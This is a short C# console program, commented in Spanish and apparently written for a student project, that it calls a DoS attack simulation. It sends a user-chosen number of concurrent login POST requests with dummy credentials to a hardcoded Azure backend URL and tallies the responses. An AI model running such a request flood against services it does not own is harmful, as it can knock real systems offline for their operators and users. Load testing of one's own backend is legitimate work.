using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Diagnostics;
using Newtonsoft.Json;
using System.Linq;

class Program
{
    private static readonly HttpClient client = new HttpClient();
    private const string BackendUrl = "https://parcial-backend-haaac3ekfubchad3.canadacentral-01.azurewebsites.net/login"; 

    static async Task Main(string[] args)
    {
        Console.WriteLine("Iniciando la simulación de ataque DoS...");
        Console.Write("Ingresa el número de peticiones concurrentes a enviar: ");
        if (!int.TryParse(Console.ReadLine(), out int numeroDePeticiones) || numeroDePeticiones <= 0)
        {
            Console.WriteLine("Número inválido. Saliendo.");
            return;
        }

        var tasks = new List<Task<bool>>();
        var stopwatch = Stopwatch.StartNew();

        Console.WriteLine($"Enviando {numeroDePeticiones} peticiones...");

        for (int i = 0; i < numeroDePeticiones; i++)
        {
            tasks.Add(EnviarPeticion(i + 1));
        }

        bool[] resultados = await Task.WhenAll(tasks);

        stopwatch.Stop();
        
        int exitosas = resultados.Count(r => r == true);
        int fallidas = numeroDePeticiones - exitosas;

        Console.WriteLine("\n--- RESUMEN DE LA SIMULACIÓN ---");
        Console.WriteLine($"Tiempo total: {stopwatch.Elapsed.TotalSeconds:F2} segundos.");
        Console.WriteLine($"Total de peticiones enviadas: {numeroDePeticiones}");
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine($"Peticiones exitosas: {exitosas}");
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"Peticiones fallidas: {fallidas}");
        Console.ResetColor();
        Console.WriteLine("---------------------------------");

        Console.WriteLine("\nSimulación finalizada. Presiona cualquier tecla para salir.");
        Console.ReadKey();
    }

    static async Task<bool> EnviarPeticion(int numeroPeticion)
    {
        try
        {
            var userData = new {
                usuario = $"user_{numeroPeticion}",
                contrasena = "password123"
            };

            var jsonContent = new StringContent(JsonConvert.SerializeObject(userData), Encoding.UTF8, "application/json");
            HttpResponseMessage response = await client.PostAsync(BackendUrl, jsonContent);

            Console.WriteLine($"Petición #{numeroPeticion}: Código de Estado {(int)response.StatusCode} ({response.ReasonPhrase})");

            return response.IsSuccessStatusCode;
        }
        catch (Exception e)
        {
            Console.WriteLine($"Petición #{numeroPeticion}: Excepción: {e.Message}");
            return false;
        }
    }
}